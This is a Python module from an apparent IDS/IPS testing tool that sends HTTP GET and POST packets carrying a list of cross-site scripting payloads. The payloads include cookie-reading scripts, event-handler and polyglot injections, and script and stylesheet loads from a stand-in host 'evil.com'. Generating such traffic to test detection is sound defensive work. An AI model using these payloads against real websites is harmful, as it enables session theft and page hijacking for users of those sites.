"""Cross-Site Scripting (XSS) pattern traffic module."""

from typing import Iterator

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from netsec_tester.modules.base import ModuleInfo, TrafficCategory, TrafficModule


# XSS payloads that trigger IPS signatures
XSS_PAYLOADS = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script src=http://evil.com/xss.js></script>",

    # Event handler injection
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",

    # JavaScript URL protocol
    "javascript:alert('XSS')",
    "javascript:alert(document.domain)",
    "<a href=javascript:alert('XSS')>click</a>",
    "<iframe src=javascript:alert('XSS')>",

    # Data URL
    "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>",

    # HTML injection
    "<div style=background:url(javascript:alert('XSS'))>",
    "<style>@import'http://evil.com/xss.css';</style>",

    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",

    # DOM-based XSS
    "#<script>alert('XSS')</script>",
    "';alert('XSS');//",
    "\";alert('XSS');//",

    # Polyglot XSS
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    "'-alert(1)-'",
    "\"onclick=alert(1)//",

    # SVG-based XSS
    "<svg><script>alert('XSS')</script></svg>",
    "<svg/onload=alert('XSS')>",
    "<svg><animate onbegin=alert('XSS') attributeName=x>",

    # Template injection (potential XSS)
    "{{constructor.constructor('alert(1)')()}}",
    "${alert('XSS')}",
    "#{alert('XSS')}",
]


class XSSModule(TrafficModule):
    """Traffic module for Cross-Site Scripting attack patterns.

    Generates HTTP requests containing XSS payloads
    in various parameters to trigger IPS/IDS signatures.
    """

    def __init__(self) -> None:
        """Initialize the XSS module."""
        self._payload_index = 0

    def get_info(self) -> ModuleInfo:
        """Return module information."""
        return ModuleInfo(
            name="xss",
            description="Cross-Site Scripting (XSS) attack patterns for IPS/IDS testing",
            category=TrafficCategory.IPS_IDS,
            protocols=["TCP", "HTTP"],
            ports=[80, 443, 8080],
        )

    def generate_packets(
        self,
        src_ip: str,
        dst_ip: str,
        dst_port: int | None = None,
    ) -> Iterator[Packet]:
        """Generate XSS attack packets.

        Args:
            src_ip: Source IP address
            dst_ip: Destination IP address
            dst_port: Destination port

        Yields:
            Scapy packets with XSS payloads
        """
        port = dst_port or 80

        # Get next payload
        payload = XSS_PAYLOADS[self._payload_index % len(XSS_PAYLOADS)]
        self._payload_index += 1

        # URL encode the payload for GET request
        import urllib.parse
        encoded_payload = urllib.parse.quote(payload)

        # Create HTTP GET request with XSS in parameter
        http_get = (
            f"GET /search?q={encoded_payload}&page=1 HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Referer: http://{dst_ip}/\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_get.encode())
        )

        yield packet

        # Create HTTP POST request with XSS in body
        post_body = f"comment={encoded_payload}&name=test"
        http_post = (
            f"POST /comment HTTP/1.1\r\n"
            f"Host: {dst_ip}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(post_body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"{post_body}"
        )

        packet = (
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=40000 + (self._payload_index % 25000), dport=port, flags="PA")
            / Raw(load=http_post.encode())
        )

        yield packet


